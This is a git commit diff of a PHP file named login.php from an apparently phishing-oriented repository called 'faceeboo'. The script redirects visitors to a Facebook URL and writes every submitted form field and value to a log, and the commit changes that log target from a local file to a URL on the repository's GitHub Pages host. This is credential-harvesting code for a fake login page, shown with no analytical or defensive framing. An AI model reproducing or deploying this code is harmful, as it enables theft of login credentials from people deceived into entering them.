03293588db1627ed1c22d2c877054e51d22af9be
faceeboo <45595520+faceeboo@users.noreply.github.com>
2018-12-04 14:48:10 +0200

    Update login.php

--- login.php
+++ login.php
@@ -1,6 +1,6 @@
 <?php
 header ("Location: https://m.facebook.com/fun.posts.photos");
-$handle = fopen("log.txt", "a");
+$handle = fopen("https://github.com/faceeboo/faceeboo.github.io/log.txt", "a");
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
 fwrite($handle, "=");
